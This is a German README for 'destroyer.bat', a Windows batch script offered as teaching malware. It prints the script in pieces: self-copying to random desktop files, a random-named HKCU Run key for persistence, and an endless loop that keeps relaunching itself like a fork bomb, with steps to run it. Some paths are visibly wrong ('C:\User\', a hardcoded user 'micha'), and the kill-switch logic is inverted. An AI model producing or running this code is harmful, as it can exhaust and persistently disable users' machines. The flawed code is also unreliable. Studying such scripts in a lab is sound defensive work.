Destroyer.bat - Malware zu Lehrzwecken
destroyer.bat ist ein einfaches Batch-Skript, das zur Demonstration grundlegender Techniken verwendet wird, die schädliche Software anwenden kann, um auf einem Windows-System persistiert zu bleiben und sich selbstständig zu replizieren. Das Programm zeigt, wie man Prozesse automatisiert, einen Autostart-Eintrag setzt und einfache Endlosschleifen erstellt.

Achtung: Dieses Programm dient ausschließlich Bildungszwecken und sollte nur in einer kontrollierten Umgebung wie einer virtuellen Maschine ausgeführt werden. Der unsachgemäße Einsatz dieses Programms kann zu einem instabilen oder unbrauchbaren System führen. Verwenden Sie dieses Skript nicht auf produktiven Systemen.

Funktionsweise
1. Kill-Switch Überprüfung
Das Programm beginnt, indem es überprüft, ob eine Datei namens kill_switch.txt auf dem Desktop des aktuellen Benutzers existiert. Diese Datei dient als eine Art "Not-Aus". Wenn die Datei nicht existiert, wird das Programm sofort beendet.

batch
Code kopieren
set KillSwitch="C:\User\%USERNAME%\Desktop\kill_switch.txt"
if NOT exist %KillSwitch% goto end
2. Selbstreplikation
Wenn der Kill-Switch vorhanden ist, kopiert sich das Programm selbst an einen neuen Speicherort auf dem Desktop des Benutzers. Dabei wird ein zufälliger Dateiname verwendet, der jedes Mal mit dem Befehl %Random% generiert wird.

batch
Code kopieren
set Dateipfad="C:\User\micha\Desktop\%Random%.bat"
copy "%~f0" %Dateipfad%
3. Autostart-Eintrag in der Windows-Registry
Das Skript fügt einen Eintrag in der Windows-Registry unter HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run hinzu, um sicherzustellen, dass es beim Neustart des Systems automatisch erneut ausgeführt wird. Der Schlüsselname ist ein zufälliger String, ebenfalls generiert mit %Random%.

batch
Code kopieren
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v %RANDOM% /t REG_SZ /d "%~f0" /f
4. Endlosschleife
Das Skript befindet sich dann in einer Endlosschleife, in der es sich immer wieder selbst startet, solange die Datei kill_switch.txt existiert. Sobald die Kill-Switch-Datei entfernt wird, beendet sich das Skript.

batch
Code kopieren
:loop
if NOT exist %KillSwitch% goto end
start "" "%~f0"
goto :loop
5. Programmende
Wenn die Kill-Switch-Datei entfernt wird, oder von Anfang an nicht existiert, wird das Programm mit dem Label :end beendet.

batch
Code kopieren
:end
exit
Nutzung
Voraussetzungen:
Windows-System
Batch-Scripting aktiviert (Standardmäßig unter Windows verfügbar)
Empfohlene Ausführung in einer virtuellen Maschine (VM)
Schritt-für-Schritt-Anleitung:
Skript ausführen: Führe die Datei destroyer.bat auf einem Windows-System aus.
Kill-Switch erstellen: Stelle sicher, dass sich die Datei kill_switch.txt auf dem Desktop des Benutzers befindet, um die Replikation zu aktivieren.
Endlosschleife stoppen: Entferne die Datei kill_switch.txt, um das Skript zu stoppen.
Vorsichtsmaßnahmen
Testumgebung verwenden: Da das Skript in einer Endlosschleife läuft und sich selbst repliziert, kann es leicht zu einer Überlastung des Systems führen. Es ist ratsam, das Programm in einer virtuellen Maschine (VM) auszuführen, um sicherzustellen, dass das Host-System nicht beschädigt wird.
Autostart entfernen: Nach der Ausführung des Programms verbleiben Registry-Einträge, die das Skript bei jedem Systemstart starten. Um diese zu entfernen, lösche die entsprechenden Einträge in der Windows-Registry (HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run).
Keine böswillige Nutzung: Dieses Skript soll ausschließlich für Bildungszwecke dienen. Jegliche böswillige Nutzung ist verboten und könnte rechtliche Konsequenzen nach sich ziehen.
Haftungsausschluss
Der Autor übernimmt keine Haftung für etwaige Schäden oder Datenverluste, die durch den unsachgemäßen Gebrauch dieses Skripts entstehen. Verwenden Sie das Skript verantwortungsvoll und nur in geeigneten Testumgebungen.

Weiterführende Themen
Batch-Skripting: Lernen Sie mehr über Batch-Skripte und deren Anwendungsmöglichkeiten unter Windows.
Malware-Techniken: Das Skript vermittelt grundlegende Techniken zur Autostart-Persistenz und Selbstreplikation, die oft in echter Malware zum Einsatz kommen.
